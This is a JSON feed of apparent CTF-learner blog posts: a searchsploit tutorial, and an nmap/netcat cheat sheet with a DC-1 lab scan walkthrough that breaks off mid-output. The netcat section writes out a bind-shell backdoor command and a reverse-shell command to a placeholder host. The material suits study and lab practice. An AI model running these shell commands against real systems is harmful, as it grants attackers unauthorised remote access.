{
    "version": "https://jsonfeed.org/version/1",
    "title": "Glad to see U (◦˙▽˙◦)",
    "subtitle": "Never hack for profit",
    "icon": "https://ctf-learner.github.io/assets/favicon.ico",
    "description": "Never hack for profit",
    "home_page_url": "https://ctf-learner.github.io",
    "items": [
        {
            "id": "https://ctf-learner.github.io/post/%E4%B8%8D%E4%BC%9A%E5%B0%B1%E6%90%9Csearchsploit/",
            "url": "https://ctf-learner.github.io/post/%E4%B8%8D%E4%BC%9A%E5%B0%B1%E6%90%9Csearchsploit/",
            "title": "不会就搜searchsploit",
            "date_published": "2024-04-19T11:52:08.000Z",
            "content_html": "<p><span class=\"label success\">上次更新时间：2024-04-19</span></p>\n<h1 id=\"searchsploit离线工具\"><a class=\"anchor\" href=\"#searchsploit离线工具\">#</a> searchsploit 离线工具</h1>\n<blockquote>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">“searchsploit” 是一个用于 Exploit-DB 的命令行搜索工具，它还允许你随身带一份 Exploit-DB 的副本。</li>\n<li class=\"lvl-2\">SearchSploit 提供了在本地保存的存储库中执行详细的离线搜索的能力。</li>\n<li class=\"lvl-2\">许多漏洞都包含了二进制文件的链接，这些文件不包含在标准存储库中，但可以在 Exploit-DB 二进制文件中找到。</li>\n</ul>\n</blockquote>\n<h1 id=\"更新searchsploit\"><a class=\"anchor\" href=\"#更新searchsploit\">#</a> 更新 searchsploit</h1>\n<div class=\"note warning\">\n<p><strong>线下 AWD 开赛前，记得跟新 searchsploit!</strong></p>\n</div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">apt</span> update <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">apt</span> <span class=\"token parameter variable\">-y</span> full-upgrade</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>searchsploit <span class=\"token parameter variable\">-u</span></pre></td></tr></table></figure><h1 id=\"searchsploit命令使用\"><a class=\"anchor\" href=\"#searchsploit命令使用\">#</a> searchsploit 命令使用</h1>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">选项</th>\n<th style=\"text-align:center\">功能</th>\n<th style=\"text-align:left\">例如</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">-u</td>\n<td style=\"text-align:center\">检查并安装任何 exploitdb 软件包更新</td>\n<td style=\"text-align:left\">searchsploit -u</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-t</td>\n<td style=\"text-align:center\">仅对标题搜索</td>\n<td style=\"text-align:left\"><code>searchsploit -t smb windows remote</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-p</td>\n<td style=\"text-align:center\">显示漏洞利用的完整路径，将路径复制到剪贴板</td>\n<td style=\"text-align:left\"><code>searchsploit -p 42315.py</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><span class=\"red\">-m</span></td>\n<td style=\"text-align:center\">复制到当前工作目录，同时获取漏洞的具体信息</td>\n<td style=\"text-align:left\"><code>searchsploit -m 42315.py</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-w</td>\n<td style=\"text-align:center\">联网搜索</td>\n<td style=\"text-align:left\"><code>searchsploit -w smb windows remote</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-j</td>\n<td style=\"text-align:center\">以 json 格式显示</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-e</td>\n<td style=\"text-align:center\">对 exploit 标题进行 EXACT 匹配</td>\n<td style=\"text-align:left\">精确匹配</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">--exclude</td>\n<td style=\"text-align:center\">选项删除不想要的结果</td>\n<td style=\"text-align:left\"><code>searchsploit smb windows remote --exclude=&quot;(POC)|txt&quot;</code></td>\n</tr>\n</tbody>\n</table>\n<p>也可以结合 <code>grep -v</code>  ：  <code>searchsploit XnView | grep -v '/dos/'</code></p>\n<p>searchsploit 后面可以填入多个搜索关键词</p>\n<div class=\"note info\">\n<p>注意：SearchSploit 使用 AND 运算符，而不是 OR 运算符。使用的术语越多，滤除的结果越多。</p>\n</div>\n<p>获取更多结果的搜索技巧：</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>Kernel 2.6.25 - &gt;Kernel 2.6 // Kernel 2.x  查询更多版本</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>SQLi -&gt; SQL Injection</code>  更准确的漏洞名称</p>\n</li>\n<li class=\"lvl-2\">\n<p>-m 选项同时可以获取该 poc 的 cve 信息</p>\n</li>\n</ul>\n<h1 id=\"常用命令\"><a class=\"anchor\" href=\"#常用命令\">#</a> 常用命令</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>示例</span></figcaption><table><tr class=\"marked\"><td data-num=\"1\"></td><td><pre>searchsploit afd windows <span class=\"token builtin class-name\">local</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token comment\"># 搜索 Windows 平台上与 AFD（Ancillary Function Driver）驱动程序相关的本地漏洞。这里为 \"local\"，表示只搜索本地漏洞。</span></pre></td></tr><tr class=\"marked\"><td data-num=\"3\"></td><td><pre> searchsploit <span class=\"token parameter variable\">-t</span> oracle windows</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> <span class=\"token comment\"># 搜索与 Windows 平台上的 Oracle 软件相关的漏洞。-t 选项指定了搜索结果的标题</span></pre></td></tr><tr class=\"marked\"><td data-num=\"5\"></td><td><pre> searchsploit <span class=\"token parameter variable\">-p</span> <span class=\"token number\">39446</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token comment\"># 直接查找一个已知的漏洞编号为 39446 的 Exploit</span></pre></td></tr><tr class=\"marked\"><td data-num=\"7\"></td><td><pre> searchsploit linux kernel <span class=\"token number\">3.2</span> <span class=\"token parameter variable\">--exclude</span> <span class=\"token operator\">=</span>“（PoC）<span class=\"token operator\">|</span> / dos /”</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 搜索与 Linux 内核版本 3.2 相关的漏洞 Exploit。--exclude 选项用于排除搜索结果中包含 \"（PoC）\" 或者 \"/dos/\" 的条目，以过滤掉一些不相关的结果。</span></pre></td></tr></table></figure><h1 id=\"检索结果\"><a class=\"anchor\" href=\"#检索结果\">#</a> 检索结果</h1>\n<p>一般情况下，搜索结果条目比较多，一下是一些路径的含义：</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><code>windows</code> : Windows 系统漏洞</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>linux</code> : Linux 系统漏洞</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>unix</code> : Unix 系统漏洞</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>exploit</code> : 含有漏洞利用代码的文件</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>shellcode</code> : 含有 Shellcode 的文件</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>papers</code> : 漏洞白皮书或技术文章</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>exploits</code> : 包含各种类型的漏洞利用代码，例如本地漏洞、远程漏洞、Web 应用程序漏洞等。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>dos</code> : 包含拒绝服务攻击（DoS）漏洞的利用代码或漏洞详情。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>remote</code> : 包含远程漏洞利用代码或漏洞详情。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>local</code> : 包含本地漏洞利用代码或漏洞详情。</p>\n</li>\n<li class=\"lvl-2\">\n<p><code>webapps</code> : 包含 Web 应用程序漏洞的利用代码或漏洞详情。</p>\n</li>\n</ul>\n<p><strong>路径下的文件：</strong><br />\n <code>txt</code>  结尾的文件一般是漏洞文件的详细信息，其他的 <code>py</code> , <code>php</code> , <code>pl</code> , <code>rb</code>  等文件就是具体利用的 exp，都是以 exp 漏洞编号命名的</p>\n<h1 id=\"实践一下\"><a class=\"anchor\" href=\"#实践一下\">#</a> 实践一下</h1>\n<p>以 dc-1 靶机为例：</p>\n<p>利用 <code>nmap -sV -A</code>  深度扫描探测版本号，或者利用 whatweb 获取靶机服务，不会用 whatweb<a href=\"\"> 戳这里</a>。发现是 cms 框架是 Drupal  7</p>\n<p><img loading=\"lazy\" data-src=\"https://s2.loli.net/2024/04/19/w2pJgaxD3Z6BWnH.png\" alt=\"image-20240419194943675\" /></p>\n<p><strong>Path</strong>：一般来说 <code>.txt</code>  文件是漏洞的详细说明，而其他文件一般是攻击代码和 exp，左边则是漏洞对于的版本号和漏洞类型</p>\n",
            "tags": [
                "Penetration Test",
                "kali tools",
                "Penetration Test"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/",
            "url": "https://ctf-learner.github.io/post/%E6%89%AB%E6%8F%8F%E4%B8%8D%E6%AD%A2-nc-nmap/",
            "title": "扫描不止 nc&nmap",
            "date_published": "2024-04-19T07:45:49.000Z",
            "content_html": "<p><span class=\"label success\">上次更新时间：2024-04-19</span><br />\n 发现自己几乎每次扫描都要查一查参数选项，而且操作及其磋脚……<br />\n 然后生了这篇文章，用来背诵</p>\n<h1 id=\"namp\"><a class=\"anchor\" href=\"#namp\">#</a> namp</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token punctuation\">[</span>Scan Type<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>Options<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">&#123;</span>target specification<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"目标说明\"><a class=\"anchor\" href=\"#目标说明\">#</a> 目标说明</h2>\n<details class=\"primary\"><summary>官方解释👇</summary><div>\n<div class=\"note info\">\n<p>ip/&lt;numbit&gt;: Nmap 将会扫描所有和该参考 IP 地址具有 &lt;numbit &gt; 相同比特的所有 IP 地址或主机.</p>\n</div>\n<div class=\"note primary\">\n<p>例如，192.168.10.0/24 将会扫描 192.168.10.0 和 192.168.10.255 之间的 256 台主机。192.168.10.40/24 将会做同样的事情。</p>\n</div>\n</div></details>\n<h2 id=\"主机发现\"><a class=\"anchor\" href=\"#主机发现\">#</a> 主机发现</h2>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-iL &lt;inputfilename&gt;</td>\n<td>从文件中输入</td>\n<td>--excludefile &lt;excludefile&gt; 同理</td>\n</tr>\n<tr>\n<td>--exclude &lt;host1[，host2][，host3]，...&gt;</td>\n<td>排除主机 / 网络</td>\n<td>以逗号分隔的列表排除它们</td>\n</tr>\n<tr>\n<td>-sL</td>\n<td>列表扫描</td>\n<td>仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机</td>\n</tr>\n<tr>\n<td>-sP</td>\n<td>Ping 扫描</td>\n<td>进行 ping 扫描，打印出对扫描做出响应的主机</td>\n</tr>\n<tr>\n<td>-P0</td>\n<td>无 ping</td>\n<td>-Pn 常用</td>\n</tr>\n<tr>\n<td>-n</td>\n<td>不用域名解析</td>\n<td>不对它发现的活动 IP 地址进行反向域名解析</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"端口扫描\"><a class=\"anchor\" href=\"#端口扫描\">#</a> 端口扫描</h2>\n<p>nmap 把端口分成六个状态: open (开放的)， closed (关闭的)，filtered (被过滤的)， unfiltered (未被过滤的)， open|filtered (开放或者被过滤的)，或者 closed|filtered (关闭或者被过滤的)</p>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-sS</td>\n<td>TCP SYN 扫描</td>\n<td><strong>常用</strong>、快速执行、不打开一个完全的 TCP 链接</td>\n</tr>\n<tr>\n<td>-sT</td>\n<td>TCP connect () 扫描</td>\n<td></td>\n</tr>\n<tr>\n<td>-sU</td>\n<td>UDP 扫描</td>\n<td>UDP 扫描一般较慢，可以使用 --host-timeout 跳过慢速的主机</td>\n</tr>\n<tr>\n<td>-p &lt;port ranges&gt;</td>\n<td>只扫描指定的端口或端口范围</td>\n<td>-p - 从端口 1 扫描到 65535</td>\n</tr>\n<tr>\n<td>-sV</td>\n<td>版本探测</td>\n<td>也可以 - A 同时启用操作系统检测和版本检测</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"-a选项的使用\"><a class=\"anchor\" href=\"#-a选项的使用\">#</a> -A 选项的使用</h2>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">选项</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">-A + -sV</td>\n<td>启用版本检测，用于识别目标主机上运行的服务及其版本信息</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A + -O</td>\n<td>启用操作系统检测，尝试识别目标主机的操作系统类型和版本</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A + -T4</td>\n<td>设置扫描的速度级别为快速（4），加快扫描速度但可能导致被检测到</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-A</td>\n<td>执行高级扫描和识别</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"输出格式\"><a class=\"anchor\" href=\"#输出格式\">#</a> 输出格式</h2>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>作用</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-oN &lt;filespec&gt;</td>\n<td>标准输出</td>\n<td>直接写入指定的文件</td>\n</tr>\n<tr>\n<td>-oG &lt;filespec&gt;</td>\n<td>Grep 输出</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"常用实例\"><a class=\"anchor\" href=\"#常用实例\">#</a> 常用实例</h2>\n<div class=\"note warning\">\n<p><strong>注意：</strong><br />\n如果是为了测试，<a href=\"http://scanme.nmap.org\">scanme.nmap.org</a> 允许被扫描。但仅允许使用 Nmap 扫描并禁止测试漏洞或进行 DoS 攻击。</p>\n</div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>nmap <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>/<span class=\"token operator\">&lt;</span>子网掩码<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 网段扫描</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> ip/子网掩码 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 扫描存活主机</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>nmap <span class=\"token parameter variable\">-sV</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token parameter variable\">-p</span> <span class=\"token operator\">&lt;</span>端口号或范围<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>nmap <span class=\"token parameter variable\">-sS</span> -p- <span class=\"token number\">192.168</span>.0.2 <span class=\"token comment\"># 扫描主机全部端口</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>nmap <span class=\"token parameter variable\">-sP</span> <span class=\"token number\">172.20</span>.x.x/24</pre></td></tr></table></figure><p>nmap 的进阶暂时用不到，有空补充</p>\n<h1 id=\"nc基础使用\"><a class=\"anchor\" href=\"#nc基础使用\">#</a> nc 基础使用</h1>\n<p>监听本地端口</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvvp</span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr></table></figure><p>连接指定端口</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr></table></figure><h2 id=\"传送exp\"><a class=\"anchor\" href=\"#传送exp\">#</a> 传送 exp</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> exp.txt <span class=\"token operator\">|</span> <span class=\"token function\">nc</span> <span class=\"token parameter variable\">-nv</span> <span class=\"token number\">192.168</span>.x.x <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-nv</span> <span class=\"token number\">192.168</span>.x.x <span class=\"token number\">80</span> <span class=\"token operator\">&lt;</span> exp.txt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 两种方式均可以讲 exp 输送到指定端口，而服务器需要开放对应端口</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">80</span> <span class=\"token operator\">></span> /tmp/received_exploit.txt</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 服务器监听端口并保存 exp</span></pre></td></tr></table></figure><h2 id=\"日志打印\"><a class=\"anchor\" href=\"#日志打印\">#</a> 日志打印</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">80</span> <span class=\"token operator\">>></span> /apache/log.txt</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 在 awd 中，攻击 80 端口的信息都会被打印下来，> 表示覆写，>> 表示追加</span></pre></td></tr></table></figure><h1 id=\"nc命令进阶使用\"><a class=\"anchor\" href=\"#nc命令进阶使用\">#</a> nc 命令进阶使用</h1>\n<h2 id=\"创造后门\"><a class=\"anchor\" href=\"#创造后门\">#</a> 创造后门</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ncat <span class=\"token parameter variable\">-l</span> <span class=\"token number\">10000</span> <span class=\"token parameter variable\">-e</span> /bin/bash</pre></td></tr></table></figure><p><code>-e</code>  标志将一个  <code>bash</code>  与端口  <code>10000</code>  相连。现在客户端只要连接到服务器上的  <code>10000</code>  端口就能通过  <code>bash</code>  获取我们系统的完整访问权限：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ncat <span class=\"token number\">192.168</span>.1.100 <span class=\"token number\">10000</span> <span class=\"token comment\"># 攻击机上连接服务器</span></pre></td></tr></table></figure><h2 id=\"扫描端口\"><a class=\"anchor\" href=\"#扫描端口\">#</a> 扫描端口</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>port-port<span class=\"token operator\">></span></pre></td></tr></table></figure><p>可以利用 - w 设置超时时间，-z 扫描，-u 设置为 UDP 模式，例如：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-u</span> <span class=\"token parameter variable\">-z</span> <span class=\"token parameter variable\">-w2</span> <span class=\"token number\">192.168</span>.0.1 <span class=\"token number\">1</span>-65535 <span class=\"token comment\"># 扫描 192.168.0.3 的端口 范围是 1-65535 即全部端口</span></pre></td></tr></table></figure><div class=\"note warning\">\n<p><strong>注意：nc 扫描会留下大量的痕迹。</strong></p>\n</div>\n<h2 id=\"反向连接弹shell\"><a class=\"anchor\" href=\"#反向连接弹shell\">#</a> 反向连接弹 shell</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-e</span> /bin/bash <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 服务端发起连接</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvp</span> <span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 攻击机连 shell</span></pre></td></tr></table></figure><h1 id=\"实战一下\"><a class=\"anchor\" href=\"#实战一下\">#</a> 实战一下</h1>\n<p>正好第一次打靶机学习渗透，以 dc-1 靶机为例</p>\n<p>kali 和 dc-1 的网络适配器都在 NET 模式，kali 的 <code>ip：192.168.234.134</code></p>\n<p>先简单扫描一下</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─<span class=\"token comment\"># nmap -sP 192.168.234.0/24</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7.94</span> <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-04-15 <span class=\"token number\">11</span>:13 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.1</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0037s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>MAC Address: 00:50:56:C0:00:08 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.2</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00078s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>MAC Address: 00:50:56:E0:4C:0C <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.129</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00040s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>MAC Address: 00:0C:29:02:FE:AE <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.254</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.00071s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>MAC Address: 00:50:56:F6:24:83 <span class=\"token punctuation\">(</span>VMware<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.134</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Host is up.</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Nmap done: <span class=\"token number\">256</span> IP addresses <span class=\"token punctuation\">(</span><span class=\"token number\">5</span> hosts up<span class=\"token punctuation\">)</span> scanned <span class=\"token keyword\">in</span> <span class=\"token number\">2.13</span> seconds</pre></td></tr></table></figure><p>用 arp-scan 同理</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─<span class=\"token comment\"># arp-scan -l</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Interface: eth0, type: EN10MB, MAC: 00:0c:29:31:18:c8, IPv4: <span class=\"token number\">192.168</span>.234.134</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Starting arp-scan <span class=\"token number\">1.10</span>.0 with <span class=\"token number\">256</span> hosts <span class=\"token punctuation\">(</span>https://github.com/royhills/arp-scan<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">192.168</span>.234.1   00:50:56:c0:00:08       VMware, Inc.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">192.168</span>.234.2   00:50:56:e0:4c:0c       VMware, Inc.</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">192.168</span>.234.129 00:0c:29:02:fe:ae       VMware, Inc.</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">192.168</span>.234.254 00:50:56:f6:24:83       VMware, Inc.</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">4</span> packets received by filter, <span class=\"token number\">0</span> packets dropped by kernel</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Ending arp-scan <span class=\"token number\">1.10</span>.0: <span class=\"token number\">256</span> hosts scanned <span class=\"token keyword\">in</span> <span class=\"token number\">2.310</span> seconds <span class=\"token punctuation\">(</span><span class=\"token number\">110.82</span> hosts/sec<span class=\"token punctuation\">)</span>.</pre></td></tr></table></figure><p>然后深度扫描</p>\n<details open>\n<summary><span class=\"pre-summary\">&nbsp;</span>👇结果有点长，点击展开逐条讲解</summary><figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>└─<span class=\"token comment\"># nmap -sV -A 192.168.234.129 </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Starting Nmap <span class=\"token number\">7.94</span> <span class=\"token punctuation\">(</span> https://nmap.org <span class=\"token punctuation\">)</span> at <span class=\"token number\">2024</span>-04-15 <span class=\"token number\">12</span>:19 EDT</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Nmap scan report <span class=\"token keyword\">for</span> <span class=\"token number\">192.168</span>.234.129  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Host is up <span class=\"token punctuation\">(</span><span class=\"token number\">0</span>.0016s latency<span class=\"token punctuation\">)</span>.</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Not shown: <span class=\"token number\">997</span> closed tcp ports <span class=\"token punctuation\">(</span>reset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>PORT    STATE SERVICE VERSION</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">22</span>/tcp  <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">6</span>.0p1 Debian <span class=\"token number\">4</span>+deb7u7 <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\"># 服务类型、版本，系统版本、协议</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">|</span> ssh-hostkey:      <span class=\"token comment\"># 密钥类型</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">1024</span> c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f <span class=\"token punctuation\">(</span>DSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">|</span>   <span class=\"token number\">2048</span> <span class=\"token number\">11</span>:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">80</span>/tcp  <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.2</span>.22 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Debian<span class=\"token punctuation\">))</span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">|</span>_http-title: Welcome to Drupal Site <span class=\"token operator\">|</span> Drupal Site</pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">|</span>_http-server-header: Apache/2.2.22 <span class=\"token punctuation\">(</span>Debian<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># apache 服务器以及版本</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">|</span> http-robots.txt: <span class=\"token number\">36</span> disallowed entries <span class=\"token punctuation\">(</span><span class=\"token number\">15</span> shown<span class=\"token punctuation\">)</span>   <span class=\"token comment\"># robots.txt 的 disable 路径</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">|</span> /includes/ /misc/ /modules/ /profiles/ /scripts/ 